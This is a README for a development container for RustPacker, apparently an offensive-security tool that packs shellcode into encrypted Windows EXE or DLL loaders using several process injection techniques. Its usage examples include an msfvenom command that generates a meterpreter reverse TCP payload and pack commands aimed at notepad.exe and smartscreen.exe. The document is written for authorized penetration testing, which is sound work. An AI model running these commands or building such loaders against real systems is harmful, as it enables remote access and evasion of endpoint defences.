# RustPacker DevContainer Setup

This DevContainer configuration provides a complete development environment for RustPacker with all necessary dependencies pre-installed.

## Features

- **Rust Development Environment**: Latest Rust toolchain with cross-compilation support
- **Cross-compilation Support**: Configured for Windows target (`x86_64-pc-windows-gnu`)
- **Essential Dependencies**: All required libraries and tools pre-installed
- **VS Code Integration**: Rust extensions and optimal settings configured
- **Development Tools**: Cargo plugins, debugging tools, and utilities
- **Helpful Aliases**: Quick commands for common RustPacker operations

## Quick Start

### Option 1: Using VS Code DevContainers (Recommended)

1. **Prerequisites**: 
   - Install [Docker](https://docs.docker.com/get-docker/)
   - Install [VS Code](https://code.visualstudio.com/)
   - Install the [Dev Containers extension](https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.remote-containers)

2. **Setup**:
   ```bash
   git clone https://github.com/Nariod/RustPacker.git
   cd RustPacker
   ```

3. **Open in DevContainer**:
   - Open VS Code in the project directory
   - Press `Ctrl+Shift+P` (or `Cmd+Shift+P` on Mac)
   - Type "Dev Containers: Reopen in Container"
   - Wait for the container to build and setup to complete

### Option 2: Using Docker Compose

```bash
cd .devcontainer
docker-compose up -d
docker-compose exec rustpacker-dev bash
```

## Directory Structure

After setup, your DevContainer will have:

```
/workspace/
├── .devcontainer/          # DevContainer configuration
├── shared/                 # Shared directory for shellcode files
├── src/                   # RustPacker source code
├── Cargo.toml            # Rust project configuration
└── setup-git.sh          # Git configuration helper
```

## Quick Commands

The DevContainer comes with helpful aliases:

- `rp [args]` - Run RustPacker with arguments
- `rpbuild` - Build release binary for Windows
- `rptest` - Run tests
- `rpcheck` - Check code without building
- `rpclippy` - Run Clippy linter
- `rpclean` - Clean build artifacts
- `shared` - Navigate to shared directory
- `ws` - Navigate to workspace root

## Usage Examples

### Basic Usage

```bash
# Create a test shellcode file
echo -n -e '\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00' > shared/test.raw

# Pack with ntcrt template and AES encryption targeting notepad.exe
rp -f shared/test.raw -i ntcrt -e aes -b exe -t notepad.exe

# Build release binary
rpbuild
```

### Real Shellcode Examples

```bash
# MSFVenom shellcode
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=80 EXITFUNC=thread -f raw -o shared/msf.bin
rp -f shared/msf.bin -i syscrt -e aes -b exe -t smartscreen.exe

# Custom output location
rp -f shared/payload.raw -i ntapc -e xor -b dll -o shared/custom_name.dll
```

## Available Templates

- **ntcrt**: NT API remote thread injection
- **ntapc**: NT API APC injection  
- **syscrt**: Indirect syscalls remote thread injection
- **wincrt**: Windows API remote thread injection
- **ntfiber**: NT API fiber execution
- **winfiber**: Windows API fiber execution
- **sysfiber**: Syscalls fiber execution

## Encryption Options

- **xor**: XOR encryption
- **aes**: AES encryption

## Output Formats

- **exe**: Executable file
- **dll**: Dynamic link library

## Development Workflow

1. **Edit Code**: Use VS Code with Rust analyzer for intelligent code completion
2. **Test Changes**: Use `rpcheck` or `rptest` for quick validation
3. **Build**: Use `rpbuild` to create Windows binaries
4. **Debug**: Use integrated debugger or `cargo run` with arguments
5. **Lint**: Use `rpclippy` for code quality checks

## Troubleshooting

### Git Configuration
If you need to configure Git for commits:
```bash
./setup-git.sh
```

### Permissions Issues
If you encounter permission issues with the shared folder:
```bash
sudo chown -R vscode:vscode /workspace/shared
```

### Rebuilding Container
If you need to rebuild the container:
- In VS Code: `Ctrl+Shift+P` → "Dev Containers: Rebuild Container"
- With Docker Compose: `docker-compose down && docker-compose up --build -d`

### Cross-compilation Issues
If cross-compilation fails, verify the target is installed:
```bash
rustup target list --installed
# Should show: x86_64-pc-windows-gnu
```

## VS Code Extensions Included

- **rust-analyzer**: Rust language server
- **CodeLLDB**: Native debugger
- **crates**: Cargo.toml management
- **Even Better TOML**: Enhanced TOML support
- **Code Runner**: Quick code execution
- **Hex Editor**: Binary file viewing
- **JSON**: JSON file support

## Performance Tips

- Use volume mounts for cargo cache (already configured)
- Keep frequently used files in the shared directory
- Use `cargo check` for quick validation during development
- Use `cargo clippy` to catch common issues early

## Security Notes

This DevContainer is designed for security research and penetration testing. The generated binaries are intended for authorized testing only. Always ensure you have proper authorization before using these tools in any environment.

## Contributing

To contribute to this DevContainer configuration:

1. Test changes in your local environment
2. Update documentation as needed
3. Submit pull requests with clear descriptions
4. Follow the existing code style and structure

## Support

For issues with the DevContainer setup:
- Check the troubleshooting section above
- Review VS Code DevContainer documentation
- Open an issue in the RustPacker repository

For RustPacker-specific issues:
- Check the main project README
- Open an issue with detailed reproduction steps
- Join the discussion in the project's Discord server